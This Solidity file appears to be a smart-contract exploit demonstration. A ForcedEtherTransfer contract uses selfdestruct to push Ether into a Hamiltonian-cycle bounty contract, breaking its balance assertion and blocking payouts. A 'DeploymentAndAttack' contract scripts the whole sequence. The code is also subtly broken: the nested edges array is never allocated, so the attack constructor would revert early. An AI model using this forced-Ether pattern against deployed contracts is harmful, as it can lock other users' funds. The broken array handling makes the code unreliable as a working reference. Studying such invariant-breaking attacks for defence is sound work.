pragma solidity ^0.8.0;

contract ForcedEtherTransfer {
    
    // Function to forcefully send Ether to an address
    function shoot(address payable _target) external payable {
        require(msg.value > 0, "Must send some ether");
        
        // Deploy a self-destructible contract and send ether to the target address
        new SelfDestructContract{value: msg.value}(_target);
    }
}

contract SelfDestructContract {
    constructor(address payable _target) payable {
        // Transfer all the ether stored in this contract to the target address and self-destruct
        selfdestruct(_target);
    }
}

contract HamiltonianCycle {
    address public owner;
    uint256 public balance;
    bool public isGraphSet;
    uint256 public nodeCount;
    mapping(uint256 => mapping(uint256 => bool)) public edges;

    constructor() {
        owner = msg.sender;
        isGraphSet = false;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can perform this action");
        _;
    }

    function deposit() external payable onlyOwner {
        balance += msg.value;
    }

    function setGraph(uint256 _nodeCount, uint256[][] memory _edges) external onlyOwner returns (string memory) {
        require(!isGraphSet, "Graph is already set");
        nodeCount = _nodeCount;
        for (uint256 i = 0; i < _edges.length; i++) {
            uint256 from = _edges[i][0];
            uint256 to = _edges[i][1];
            require(from < nodeCount && to < nodeCount, "Invalid node index");
            edges[from][to] = true;
        }
        isGraphSet = true;
        return "wo hen gao xing ren shi ni!";
    }

    function findHamiltonianCycle(uint256[] memory cycle) external {
        require(isGraphSet, "Graph is not set");
        require(cycle.length == nodeCount, "Cycle length must be equal to node count");

        bool[] memory visited = new bool[](nodeCount);

        for (uint256 i = 0; i < nodeCount; i++) {
            uint256 current = cycle[i];
            uint256 next = cycle[(i + 1) % nodeCount];

            require(current < nodeCount && next < nodeCount, "Invalid node index in cycle");
            require(edges[current][next], "No edge between nodes");

            visited[current] = true;
        }

        for (uint256 i = 0; i < nodeCount; i++) {
            require(visited[i], "Not all nodes visited");
        }

        assert(address(this).balance == balance);

        selfdestruct(payable(msg.sender));
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DeploymentAndAttack {
    HamiltonianCycle public hamiltonianCycle;
    ForcedEtherTransfer public forcedEtherTransfer;

    constructor() payable {
        // Step 1: Deploy the HamiltonianCycle contract
        hamiltonianCycle = new HamiltonianCycle();

        // Step 2: Deposit 1 ether into the HamiltonianCycle contract
        (bool success, ) = address(hamiltonianCycle).call{value: msg.value / 2}(abi.encodeWithSignature("deposit()"));
        require(success, "Deposit failed");

        // Step 3: Set the graph in the HamiltonianCycle contract
        uint256[][] memory edges = new uint256[][](3);
        edges[0][0] = 0;
        edges[0][1] = 1;

        edges[1][0] = 1;
        edges[1][1] = 2;

        edges[2][0] = 2;
        edges[2][1] = 0;

        hamiltonianCycle.setGraph(3, edges);

        // Step 4: Force Ether into the HamiltonianCycle contract
        forcedEtherTransfer = new ForcedEtherTransfer();
        forcedEtherTransfer.shoot{value: msg.value / 2}(payable(address(hamiltonianCycle)));

        // Step 5: Call the findHamiltonianCycle function with a valid cycle
        uint256[] memory cycle = new uint256[](3);
        cycle[0] = 0;
        cycle[1] = 1;
        cycle[2] = 2;

        hamiltonianCycle.findHamiltonianCycle(cycle);
    }
}
